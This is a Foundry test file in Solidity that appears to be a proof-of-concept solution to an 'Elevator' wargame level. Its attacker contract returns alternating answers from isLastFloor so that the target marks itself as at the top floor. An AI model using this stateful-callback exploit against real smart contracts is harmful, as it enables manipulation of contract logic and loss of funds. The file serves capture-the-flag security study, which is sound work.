// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level11.sol";

contract POC is Test {
    Elevator level11 = new Elevator();
    ElevatorAttacker attacker = new ElevatorAttacker(address(level11));

    function test() external {
        vm.startBroadcast();

        level11.top();
        attacker.exploit();
        level11.top();

        vm.stopBroadcast();
    }
}

contract ElevatorAttacker {
    address elevator;
    uint256 public count;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    function exploit() public {
        address(elevator).call(abi.encodeWithSignature("goTo(uint256)", 1));
    }

    function isLastFloor(uint256) public returns (bool) {
        if (count % 2 == 0) {
            count++;
            return false;
        } else {
            count++;
            return true;
        }
    }
}
